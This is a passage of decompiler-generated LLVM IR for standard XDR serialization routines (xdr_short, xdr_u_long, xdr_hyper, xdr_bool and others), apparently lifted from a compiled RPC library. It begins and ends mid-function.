  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_10024014, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024058, { 1, 0 }
  uselistorder label %dec_label_pc_10024044, { 1, 0 }
}

define i32 @xdr_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i16, align 2
  store i32 %arg2, i32* %r31.global-to-local, align 4
  %v0_10024084 = load i32, i32* %r3.global-to-local, align 4
  %v1_10024084 = inttoptr i32 %v0_10024084 to i32*
  %v2_10024084 = load i32, i32* %v1_10024084, align 4
  %v3_10024088 = icmp eq i32 %v2_10024084, 1
  br i1 %v3_10024088, label %dec_label_pc_100240c4, label %dec_label_pc_10024094

dec_label_pc_10024094:                            ; preds = %entry
  %v1_1002408c = icmp eq i32 %v2_10024084, 0
  br i1 %v1_1002408c, label %dec_label_pc_100240a8, label %dec_label_pc_1002409c

dec_label_pc_1002409c:                            ; preds = %dec_label_pc_10024094
  %v3_10024094 = icmp eq i32 %v2_10024084, 2
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10024094, label %dec_label_pc_100240f0, label %dec_label_pc_100240ec

dec_label_pc_100240a8:                            ; preds = %dec_label_pc_10024094
  %v1_100240a8 = inttoptr i32 %arg2 to i16*
  %v2_100240a8 = load i16, i16* %v1_100240a8, align 2
  %v1_100240ac = add i32 %v0_10024084, 4
  %v2_100240ac = inttoptr i32 %v1_100240ac to i32*
  %v3_100240ac = load i32, i32* %v2_100240ac, align 4
  store i16 %v2_100240a8, i16* %stack_var_-24, align 2
  %v1_100240b4 = add i32 %v3_100240ac, 4
  %v2_100240b4 = inttoptr i32 %v1_100240b4 to i32*
  %v3_100240b4 = load i32, i32* %v2_100240b4, align 4
  call void @__pseudo_call(i32 %v3_100240b4)
  br label %dec_label_pc_100240f0

dec_label_pc_100240c4:                            ; preds = %entry
  %v1_100240c4 = add i32 %v0_10024084, 4
  %v2_100240c4 = inttoptr i32 %v1_100240c4 to i32*
  %v3_100240c4 = load i32, i32* %v2_100240c4, align 4
  %v1_100240c8 = inttoptr i32 %v3_100240c4 to i32*
  %v2_100240c8 = load i32, i32* %v1_100240c8, align 4
  call void @__pseudo_call(i32 %v2_100240c8)
  %v0_100240d4 = load i32, i32* %r3.global-to-local, align 4
  %v3_100240d4 = icmp eq i32 %v0_100240d4, 0
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_100240d4, label %dec_label_pc_100240ec, label %dec_label_pc_100240e0

dec_label_pc_100240e0:                            ; preds = %dec_label_pc_100240c4
  %v3_100240e0 = load i16, i16* %stack_var_-24, align 2
  %v2_100240e4 = load i32, i32* %r31.global-to-local, align 4
  %v3_100240e4 = inttoptr i32 %v2_100240e4 to i16*
  store i16 %v3_100240e0, i16* %v3_100240e4, align 2
  br label %dec_label_pc_100240f0

dec_label_pc_100240ec:                            ; preds = %dec_label_pc_1002409c, %dec_label_pc_100240c4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100240f0

dec_label_pc_100240f0:                            ; preds = %dec_label_pc_1002409c, %dec_label_pc_100240e0, %dec_label_pc_100240a8, %dec_label_pc_100240ec
  %v0_10024100 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10024100

; uselistorder directives
  uselistorder i16* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_100240f0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100240ec, { 1, 0 }
}

define i32 @__GI_xdr_int(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10024104 = call i32 @__GI_xdr_long()
  ret i32 %v0_10024104
}

define i32 @xdr_u_long() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10024114 = load i32, i32* @r4, align 4
  store i32 %v0_10024114, i32* %r31.global-to-local, align 4
  %v0_1002411c = load i32, i32* @r3, align 4
  %v1_1002411c = inttoptr i32 %v0_1002411c to i32*
  %v2_1002411c = load i32, i32* %v1_1002411c, align 4
  %v3_10024120 = icmp eq i32 %v2_1002411c, 1
  br i1 %v3_10024120, label %dec_label_pc_10024140, label %dec_label_pc_1002412c

dec_label_pc_1002412c:                            ; preds = %entry
  %v1_10024124 = icmp eq i32 %v2_1002411c, 0
  br i1 %v1_10024124, label %dec_label_pc_1002416c, label %dec_label_pc_10024134

dec_label_pc_10024134:                            ; preds = %dec_label_pc_1002412c
  %v3_1002412c = icmp eq i32 %v2_1002411c, 2
  store i32 1, i32* @r3, align 4
  br i1 %v3_1002412c, label %dec_label_pc_10024184, label %dec_label_pc_10024180

dec_label_pc_10024140:                            ; preds = %entry
  %v1_10024140 = add i32 %v0_1002411c, 4
  %v2_10024140 = inttoptr i32 %v1_10024140 to i32*
  %v3_10024140 = load i32, i32* %v2_10024140, align 4
  %v1_10024148 = inttoptr i32 %v3_10024140 to i32*
  %v2_10024148 = load i32, i32* %v1_10024148, align 4
  call void @__pseudo_call(i32 %v2_10024148)
  %v0_10024154 = load i32, i32* @r3, align 4
  %v3_10024154 = icmp eq i32 %v0_10024154, 0
  store i32 1, i32* @r3, align 4
  br i1 %v3_10024154, label %dec_label_pc_10024180, label %dec_label_pc_10024160

dec_label_pc_10024160:                            ; preds = %dec_label_pc_10024140
  %v3_10024160 = load i32, i32* %stack_var_-24, align 4
  %v1_10024164 = load i32, i32* %r31.global-to-local, align 4
  %v2_10024164 = inttoptr i32 %v1_10024164 to i32*
  store i32 %v3_10024160, i32* %v2_10024164, align 4
  br label %dec_label_pc_10024184

dec_label_pc_1002416c:                            ; preds = %dec_label_pc_1002412c
  %v1_1002416c = add i32 %v0_1002411c, 4
  %v2_1002416c = inttoptr i32 %v1_1002416c to i32*
  %v3_1002416c = load i32, i32* %v2_1002416c, align 4
  %v1_10024170 = add i32 %v3_1002416c, 4
  %v2_10024170 = inttoptr i32 %v1_10024170 to i32*
  %v3_10024170 = load i32, i32* %v2_10024170, align 4
  call void @__pseudo_call(i32 %v3_10024170)
  br label %dec_label_pc_10024184

dec_label_pc_10024180:                            ; preds = %dec_label_pc_10024134, %dec_label_pc_10024140
  store i32 0, i32* @r3, align 4
  br label %dec_label_pc_10024184

dec_label_pc_10024184:                            ; preds = %dec_label_pc_10024134, %dec_label_pc_1002416c, %dec_label_pc_10024160, %dec_label_pc_10024180
  %v0_10024194 = load i32, i32* @r3, align 4
  ret i32 %v0_10024194

; uselistorder directives
  uselistorder i32 %v0_1002411c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024184, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10024180, { 1, 0 }
}

define i32 @xdr_u_int(i32* %xdrs, i32* %ulp) local_unnamed_addr {
entry:
  %v0_10024198 = call i32 @xdr_u_long()
  ret i32 %v0_10024198
}

define i32 @__GI_xdr_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1002419c = load i32, i32* @lr, align 4
  store i32 %v0_1002419c, i32* %r0.global-to-local, align 4
  %v0_100241a8 = load i32, i32* @r4, align 4
  store i32 %v0_100241a8, i32* %r30.global-to-local, align 4
  %v0_100241b0 = load i32, i32* @r3, align 4
  store i32 %v0_100241b0, i32* %r31.global-to-local, align 4
  %v1_100241b8 = inttoptr i32 %v0_100241b0 to i32*
  %v2_100241b8 = load i32, i32* %v1_100241b8, align 4
  store i32 %v2_100241b8, i32* %r0.global-to-local, align 4
  %v3_100241bc = icmp eq i32 %v2_100241b8, 0
  br i1 %v3_100241bc, label %dec_label_pc_100241c8, label %dec_label_pc_10024228

dec_label_pc_100241c8:                            ; preds = %entry
  %v1_100241c8 = inttoptr i32 %v0_100241a8 to i32*
  %v2_100241c8 = load i32, i32* %v1_100241c8, align 4
  %v1_100241cc = add i32 %v0_100241a8, 4
  %v2_100241cc = inttoptr i32 %v1_100241cc to i32*
  %v3_100241d0 = load i32, i32* %v2_100241cc, align 4
  store i32 %v3_100241d0, i32* %r0.global-to-local, align 4
  %v1_100241dc = add i32 %v0_100241b0, 4
  %v2_100241dc = inttoptr i32 %v1_100241dc to i32*
  %v3_100241dc = load i32, i32* %v2_100241dc, align 4
  store i32 %v2_100241c8, i32* %stack_var_-24, align 4
  store i32 %v3_100241d0, i32* %stack_var_-20, align 4
  %v1_100241e8 = add i32 %v3_100241dc, 4
  %v2_100241e8 = inttoptr i32 %v1_100241e8 to i32*
  %v3_100241e8 = load i32, i32* %v2_100241e8, align 4
  call void @__pseudo_call(i32 %v3_100241e8)
  %v0_100241f8 = load i32, i32* @r3, align 4
  %v3_100241f8 = icmp eq i32 %v0_100241f8, 0
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_10024200 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10024200, i32* %r3.global-to-local, align 4
  br i1 %v3_100241f8, label %dec_label_pc_10024290, label %dec_label_pc_10024208

dec_label_pc_10024208:                            ; preds = %dec_label_pc_100241c8
  %v1_10024208 = add i32 %v0_10024200, 4
  %v2_10024208 = inttoptr i32 %v1_10024208 to i32*
  %v3_10024208 = load i32, i32* %v2_10024208, align 4
  %v1_1002420c = add i32 %v3_10024208, 4
  %v2_1002420c = inttoptr i32 %v1_1002420c to i32*
  %v3_1002420c = load i32, i32* %v2_1002420c, align 4
  call void @__pseudo_call(i32 %v3_1002420c)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10024290

dec_label_pc_10024228:                            ; preds = %entry
  %v3_100241c0 = icmp eq i32 %v2_100241b8, 1
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v3_100241c0, label %dec_label_pc_1002423c, label %dec_label_pc_10024290

dec_label_pc_1002423c:                            ; preds = %dec_label_pc_10024228
  %v1_1002423c = add i32 %v0_100241b0, 4
  %v2_1002423c = inttoptr i32 %v1_1002423c to i32*
  %v3_1002423c = load i32, i32* %v2_1002423c, align 4
  %v1_10024240 = inttoptr i32 %v3_1002423c to i32*
  %v2_10024240 = load i32, i32* %v1_10024240, align 4
  call void @__pseudo_call(i32 %v2_10024240)
  %v0_10024250 = load i32, i32* @r3, align 4
  %v3_10024250 = icmp eq i32 %v0_10024250, 0
  %v0_10024254 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10024254, i32* %r3.global-to-local, align 4
  br i1 %v3_10024250, label %dec_label_pc_1002428c, label %dec_label_pc_1002425c

dec_label_pc_1002425c:                            ; preds = %dec_label_pc_1002423c
  %v1_1002425c = add i32 %v0_10024254, 4
  %v2_1002425c = inttoptr i32 %v1_1002425c to i32*
  %v3_1002425c = load i32, i32* %v2_1002425c, align 4
  %v1_10024260 = inttoptr i32 %v3_1002425c to i32*
  %v2_10024260 = load i32, i32* %v1_10024260, align 4
  call void @__pseudo_call(i32 %v2_10024260)
  store i32 1, i32* %r8.global-to-local, align 4
  %v0_10024270 = load i32, i32* %r3.global-to-local, align 4
  %v3_10024270 = icmp eq i32 %v0_10024270, 0
  br i1 %v3_10024270, label %dec_label_pc_1002428c, label %dec_label_pc_10024278

dec_label_pc_10024278:                            ; preds = %dec_label_pc_1002425c
  %v3_10024278 = load i32, i32* %stack_var_-20, align 4
  %v3_1002427c = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_1002427c, i32* %r0.global-to-local, align 4
  %v1_10024280 = load i32, i32* %r30.global-to-local, align 4
  %v2_10024280 = add i32 %v1_10024280, 4
  %v3_10024280 = inttoptr i32 %v2_10024280 to i32*
  store i32 %v3_10024278, i32* %v3_10024280, align 4
  %v0_10024284 = load i32, i32* %r0.global-to-local, align 4
  %v1_10024284 = load i32, i32* %r30.global-to-local, align 4
  %v2_10024284 = inttoptr i32 %v1_10024284 to i32*
  store i32 %v0_10024284, i32* %v2_10024284, align 4
  %v0_10024294.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10024290

dec_label_pc_1002428c:                            ; preds = %dec_label_pc_1002425c, %dec_label_pc_1002423c
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10024290

dec_label_pc_10024290:                            ; preds = %dec_label_pc_10024228, %dec_label_pc_100241c8, %dec_label_pc_10024278, %dec_label_pc_10024208, %dec_label_pc_1002428c
  %v0_10024294 = phi i32 [ 0, %dec_label_pc_10024228 ], [ 0, %dec_label_pc_100241c8 ], [ %v0_10024294.pre, %dec_label_pc_10024278 ], [ 1, %dec_label_pc_10024208 ], [ 0, %dec_label_pc_1002428c ]
  store i32 %v0_1002419c, i32* %r0.global-to-local, align 4
  store i32 %v0_10024294, i32* %r3.global-to-local, align 4
  ret i32 %v0_10024294

; uselistorder directives
  uselistorder i32 %v0_10024294, { 1, 0 }
  uselistorder i32 %v0_100241b0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100241a8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024290, { 4, 2, 0, 3, 1 }
}

define i32 @xdr_u_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100242a8 = load i32, i32* @lr, align 4
  store i32 %v0_100242a8, i32* %r0.global-to-local, align 4
  %v0_100242b4 = load i32, i32* @r4, align 4
  store i32 %v0_100242b4, i32* %r30.global-to-local, align 4
  %v0_100242bc = load i32, i32* @r3, align 4
  store i32 %v0_100242bc, i32* %r31.global-to-local, align 4
  %v1_100242c4 = inttoptr i32 %v0_100242bc to i32*
  %v2_100242c4 = load i32, i32* %v1_100242c4, align 4
  store i32 %v2_100242c4, i32* %r0.global-to-local, align 4
  %v3_100242c8 = icmp eq i32 %v2_100242c4, 0
  br i1 %v3_100242c8, label %dec_label_pc_100242d4, label %dec_label_pc_10024328

dec_label_pc_100242d4:                            ; preds = %entry
  %v1_100242d4 = add i32 %v0_100242b4, 4
  %v2_100242d4 = inttoptr i32 %v1_100242d4 to i32*
  %v3_100242d4 = load i32, i32* %v2_100242d4, align 4
  store i32 %v3_100242d4, i32* %r0.global-to-local, align 4
  %v1_100242d8 = inttoptr i32 %v0_100242b4 to i32*
  %v2_100242d8 = load i32, i32* %v1_100242d8, align 4
  store i32 %v2_100242d8, i32* %r10.global-to-local, align 4
  %v1_100242dc = add i32 %v0_100242bc, 4
  %v2_100242dc = inttoptr i32 %v1_100242dc to i32*
  %v3_100242dc = load i32, i32* %v2_100242dc, align 4
  store i32 %v3_100242d4, i32* %stack_var_-20, align 4
  store i32 %v2_100242d8, i32* %stack_var_-24, align 4
  %v1_100242e8 = add i32 %v3_100242dc, 4
  %v2_100242e8 = inttoptr i32 %v1_100242e8 to i32*
  %v3_100242e8 = load i32, i32* %v2_100242e8, align 4
  call void @__pseudo_call(i32 %v3_100242e8)
  %v0_100242f8 = load i32, i32* @r3, align 4
  %v3_100242f8 = icmp eq i32 %v0_100242f8, 0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10024300 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10024300, i32* %r3.global-to-local, align 4
  br i1 %v3_100242f8, label %dec_label_pc_10024390, label %dec_label_pc_10024308

dec_label_pc_10024308:                            ; preds = %dec_label_pc_100242d4
  %v1_10024308 = add i32 %v0_10024300, 4
  %v2_10024308 = inttoptr i32 %v1_10024308 to i32*
  %v3_10024308 = load i32, i32* %v2_10024308, align 4
  %v1_1002430c = add i32 %v3_10024308, 4
  %v2_1002430c = inttoptr i32 %v1_1002430c to i32*
  %v3_1002430c = load i32, i32* %v2_1002430c, align 4
  call void @__pseudo_call(i32 %v3_1002430c)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10024390

dec_label_pc_10024328:                            ; preds = %entry
  %v3_100242cc = icmp eq i32 %v2_100242c4, 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_100242cc, label %dec_label_pc_1002433c, label %dec_label_pc_10024390

dec_label_pc_1002433c:                            ; preds = %dec_label_pc_10024328
  %v1_1002433c = add i32 %v0_100242bc, 4
  %v2_1002433c = inttoptr i32 %v1_1002433c to i32*
  %v3_1002433c = load i32, i32* %v2_1002433c, align 4
  %v1_10024340 = inttoptr i32 %v3_1002433c to i32*
  %v2_10024340 = load i32, i32* %v1_10024340, align 4
  call void @__pseudo_call(i32 %v2_10024340)
  %v0_10024350 = load i32, i32* @r3, align 4
  %v3_10024350 = icmp eq i32 %v0_10024350, 0
  %v0_10024354 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10024354, i32* %r3.global-to-local, align 4
  br i1 %v3_10024350, label %dec_label_pc_1002438c, label %dec_label_pc_1002435c

dec_label_pc_1002435c:                            ; preds = %dec_label_pc_1002433c
  %v1_1002435c = add i32 %v0_10024354, 4
  %v2_1002435c = inttoptr i32 %v1_1002435c to i32*
  %v3_1002435c = load i32, i32* %v2_1002435c, align 4
  %v1_10024360 = inttoptr i32 %v3_1002435c to i32*
  %v2_10024360 = load i32, i32* %v1_10024360, align 4
  call void @__pseudo_call(i32 %v2_10024360)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10024370 = load i32, i32* %r3.global-to-local, align 4
  %v3_10024370 = icmp eq i32 %v0_10024370, 0
  br i1 %v3_10024370, label %dec_label_pc_1002438c, label %dec_label_pc_10024378

dec_label_pc_10024378:                            ; preds = %dec_label_pc_1002435c
  %v3_10024378 = load i32, i32* %stack_var_-24, align 4
  %v3_1002437c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_1002437c, i32* %r10.global-to-local, align 4
  %v1_10024380 = load i32, i32* %r30.global-to-local, align 4
  %v2_10024380 = inttoptr i32 %v1_10024380 to i32*
  store i32 %v3_10024378, i32* %v2_10024380, align 4
  %v0_10024384 = load i32, i32* %r10.global-to-local, align 4
  %v1_10024384 = load i32, i32* %r30.global-to-local, align 4
  %v2_10024384 = add i32 %v1_10024384, 4
  %v3_10024384 = inttoptr i32 %v2_10024384 to i32*
  store i32 %v0_10024384, i32* %v3_10024384, align 4
  %v0_10024390.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10024390

dec_label_pc_1002438c:                            ; preds = %dec_label_pc_1002435c, %dec_label_pc_1002433c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10024390

dec_label_pc_10024390:                            ; preds = %dec_label_pc_10024328, %dec_label_pc_100242d4, %dec_label_pc_10024378, %dec_label_pc_10024308, %dec_label_pc_1002438c
  %v0_10024390 = phi i32 [ 0, %dec_label_pc_10024328 ], [ 0, %dec_label_pc_100242d4 ], [ %v0_10024390.pre, %dec_label_pc_10024378 ], [ 1, %dec_label_pc_10024308 ], [ 0, %dec_label_pc_1002438c ]
  store i32 %v0_10024390, i32* %r3.global-to-local, align 4
  store i32 %v0_100242a8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10024390

; uselistorder directives
  uselistorder i32 %v0_10024390, { 1, 0 }
  uselistorder i32 %v0_100242bc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100242b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024390, { 4, 2, 0, 3, 1 }
}

define i32 @xdr_longlong_t() local_unnamed_addr {
entry:
  %v0_100243a8 = call i32 @__GI_xdr_hyper()
  ret i32 %v0_100243a8
}

define i32 @xdr_u_longlong_t(i32* %xdrs, i64* %ullp) local_unnamed_addr {
entry:
  %v0_100243ac = call i32 @xdr_u_hyper()
  ret i32 %v0_100243ac
}

define i32 @__GI_xdr_u_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i16, align 2
  store i32 %arg2, i32* %r31.global-to-local, align 4
  %v0_100243c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100243c8 = inttoptr i32 %v0_100243c8 to i32*
  %v2_100243c8 = load i32, i32* %v1_100243c8, align 4
  %v3_100243cc = icmp eq i32 %v2_100243c8, 1
  br i1 %v3_100243cc, label %dec_label_pc_10024408, label %dec_label_pc_100243d8

dec_label_pc_100243d8:                            ; preds = %entry
  %v1_100243d0 = icmp eq i32 %v2_100243c8, 0
  br i1 %v1_100243d0, label %dec_label_pc_100243ec, label %dec_label_pc_100243e0

dec_label_pc_100243e0:                            ; preds = %dec_label_pc_100243d8
  %v3_100243d8 = icmp eq i32 %v2_100243c8, 2
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_100243d8, label %dec_label_pc_10024434, label %dec_label_pc_10024430

dec_label_pc_100243ec:                            ; preds = %dec_label_pc_100243d8
  %v1_100243ec = inttoptr i32 %arg2 to i16*
  %v2_100243ec = load i16, i16* %v1_100243ec, align 2
  %v1_100243f0 = add i32 %v0_100243c8, 4
  %v2_100243f0 = inttoptr i32 %v1_100243f0 to i32*
  %v3_100243f0 = load i32, i32* %v2_100243f0, align 4
  store i16 %v2_100243ec, i16* %stack_var_-24, align 2
  %v1_100243f8 = add i32 %v3_100243f0, 4
  %v2_100243f8 = inttoptr i32 %v1_100243f8 to i32*
  %v3_100243f8 = load i32, i32* %v2_100243f8, align 4
  call void @__pseudo_call(i32 %v3_100243f8)
  br label %dec_label_pc_10024434

dec_label_pc_10024408:                            ; preds = %entry
  %v1_10024408 = add i32 %v0_100243c8, 4
  %v2_10024408 = inttoptr i32 %v1_10024408 to i32*
  %v3_10024408 = load i32, i32* %v2_10024408, align 4
  %v1_1002440c = inttoptr i32 %v3_10024408 to i32*
  %v2_1002440c = load i32, i32* %v1_1002440c, align 4
  call void @__pseudo_call(i32 %v2_1002440c)
  %v0_10024418 = load i32, i32* %r3.global-to-local, align 4
  %v3_10024418 = icmp eq i32 %v0_10024418, 0
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10024418, label %dec_label_pc_10024430, label %dec_label_pc_10024424

dec_label_pc_10024424:                            ; preds = %dec_label_pc_10024408
  %v3_10024424 = load i16, i16* %stack_var_-24, align 2
  %v2_10024428 = load i32, i32* %r31.global-to-local, align 4
  %v3_10024428 = inttoptr i32 %v2_10024428 to i16*
  store i16 %v3_10024424, i16* %v3_10024428, align 2
  br label %dec_label_pc_10024434

dec_label_pc_10024430:                            ; preds = %dec_label_pc_100243e0, %dec_label_pc_10024408
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024434

dec_label_pc_10024434:                            ; preds = %dec_label_pc_100243e0, %dec_label_pc_10024424, %dec_label_pc_100243ec, %dec_label_pc_10024430
  %v0_10024444 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10024444

; uselistorder directives
  uselistorder i16* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_10024434, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10024430, { 1, 0 }
}

define i32 @xdr_char(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i8, align 1
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1002445c = load i8, i8* %arg1, align 1
  %v2_10024460 = ptrtoint i8* %stack_var_-24 to i32
  store i8 %v3_1002445c, i8* %stack_var_-24, align 1
  store i32 268584044, i32* @lr, align 4
  %v1_10024468 = call i32 @__GI_xdr_int(i32 %v2_10024460)
  %v3_1002446c = icmp eq i32 %v1_10024468, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1002446c, label %dec_label_pc_10024484, label %dec_label_pc_10024478

dec_label_pc_10024478:                            ; preds = %entry
  %v3_10024478 = load i8, i8* %stack_var_-24, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_10024480 = load i32, i32* %r31.global-to-local, align 4
  %v3_10024480 = inttoptr i32 %v2_10024480 to i8*
  store i8 %v3_10024478, i8* %v3_10024480, align 1
  %v0_10024494.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10024484

dec_label_pc_10024484:                            ; preds = %entry, %dec_label_pc_10024478
  %v0_10024494 = phi i32 [ 0, %entry ], [ %v0_10024494.pre, %dec_label_pc_10024478 ]
  ret i32 %v0_10024494

; uselistorder directives
  uselistorder i8* %stack_var_-24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10024484, { 1, 0 }
}

define i32 @xdr_u_char(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i8, align 1
  store i32 %tmp, i32* @r31, align 4
  %v3_100244ac = load i8, i8* %arg1, align 1
  %v2_100244b0 = ptrtoint i8* %stack_var_-24 to i32
  store i32 %v2_100244b0, i32* @r4, align 4
  store i8 %v3_100244ac, i8* %stack_var_-24, align 1
  store i32 268584124, i32* @lr, align 4
  %v2_100244b8 = bitcast i8* %stack_var_-24 to i32*
  %v4_100244b8 = call i32 @xdr_u_int(i32* %v2_100244b8, i32* %v2_100244b8)
  %v3_100244bc = icmp eq i32 %v4_100244b8, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_100244bc, label %dec_label_pc_100244d4, label %dec_label_pc_100244c8

dec_label_pc_100244c8:                            ; preds = %entry
  %v3_100244c8 = load i8, i8* %stack_var_-24, align 1
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_100244d0 = load i32, i32* @r31, align 4
  %v3_100244d0 = inttoptr i32 %v2_100244d0 to i8*
  store i8 %v3_100244c8, i8* %v3_100244d0, align 1
  %v0_100244e4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100244d4

dec_label_pc_100244d4:                            ; preds = %entry, %dec_label_pc_100244c8
  %v0_100244e4 = phi i32 [ 0, %entry ], [ %v0_100244e4.pre, %dec_label_pc_100244c8 ]
  ret i32 %v0_100244e4

; uselistorder directives
  uselistorder i8* %stack_var_-24, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_100244d4, { 1, 0 }
}

define i32 @xdr_bool(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %r31.global-to-local, align 4
  %v0_10024500 = load i32, i32* %r3.global-to-local, align 4
  %v1_10024500 = inttoptr i32 %v0_10024500 to i32*
  %v2_10024500 = load i32, i32* %v1_10024500, align 4
  %v3_10024504 = icmp eq i32 %v2_10024500, 1
  br i1 %v3_10024504, label %dec_label_pc_10024548, label %dec_label_pc_10024510

dec_label_pc_10024510:                            ; preds = %entry
  %v1_10024508 = icmp eq i32 %v2_10024500, 0
  br i1 %v1_10024508, label %dec_label_pc_10024524, label %dec_label_pc_10024518

dec_label_pc_10024518:                            ; preds = %dec_label_pc_10024510
  %v3_10024510 = icmp eq i32 %v2_10024500, 2
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10024510, label %dec_label_pc_1002457c, label %dec_label_pc_10024578

dec_label_pc_10024524:                            ; preds = %dec_label_pc_10024510
  %v1_10024524 = inttoptr i32 %arg2 to i32*
  %v2_10024524 = load i32, i32* %v1_10024524, align 4
  %v1_10024528 = add i32 %v0_10024500, 4
  %v2_10024528 = inttoptr i32 %v1_10024528 to i32*
  %v3_10024528 = load i32, i32* %v2_10024528, align 4
  %v2_1002452c = icmp ne i32 %v2_10024524, 0
  %v5_10024530 = zext i1 %v2_1002452c to i32
  store i32 %v5_10024530, i32* %stack_var_-24, align 4
  %v1_10024538 = add i32 %v3_10024528, 4
  %v2_10024538 = inttoptr i32 %v1_10024538 to i32*
  %v3_10024538 = load i32, i32* %v2_10024538, align 4
  call void @__pseudo_call(i32 %v3_10024538)
  br label %dec_label_pc_1002457c

dec_label_pc_10024548:                            ; preds = %entry
  %v1_10024548 = add i32 %v0_10024500, 4
  %v2_10024548 = inttoptr i32 %v1_10024548 to i32*
  %v3_10024548 = load i32, i32* %v2_10024548, align 4
  %v1_1002454c = inttoptr i32 %v3_10024548 to i32*
  %v2_1002454c = load i32, i32* %v1_1002454c, align 4
  call void @__pseudo_call(i32 %v2_1002454c)
  %v0_10024558 = load i32, i32* %r3.global-to-local, align 4
  %v3_10024558 = icmp eq i32 %v0_10024558, 0
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_10024558, label %dec_label_pc_10024578, label %dec_label_pc_10024564

dec_label_pc_10024564:                            ; preds = %dec_label_pc_10024548
  %v3_10024564 = load i32, i32* %stack_var_-24, align 4
  %v2_10024568 = icmp ne i32 %v3_10024564, 0
  %v5_1002456c = zext i1 %v2_10024568 to i32
  %v1_10024570 = load i32, i32* %r31.global-to-local, align 4
